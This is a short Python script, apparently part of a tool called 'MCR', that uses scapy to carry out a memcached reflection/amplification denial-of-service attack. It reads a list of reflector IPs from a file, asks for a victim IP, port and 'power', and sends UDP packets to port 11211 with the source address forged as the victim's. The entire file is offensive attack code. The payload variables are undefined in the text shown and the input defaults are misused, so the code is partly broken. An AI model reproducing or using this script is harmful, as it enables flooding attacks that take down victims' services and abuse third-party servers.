from scapy.all import *
from scapy.layers.inet import IP, UDP


def cli():
    print("Loading bots")
    bots = open("./data/valid-ip.txt").readlines()
    target = input("MCR>Attack Enter target ip : " or "0.0.0.0")
    targetport = input("MCR>Attack Enter target port : " or "0")
    power = input("MCR>Attack Enter power for attack :" or 1)
    for bot in bots:
        print('[+] Sending 2 forged synchronized payloads to: %s' % (bot))
        send(IP(src=target, dst='%s' % bot) / UDP(sport=int(targetport), dport=11211) / Raw(load=setdata), count=1)
        send(IP(src=target, dst='%s' % bot) / UDP(sport=int(targetport), dport=11211) / Raw(load=getdata), count=power)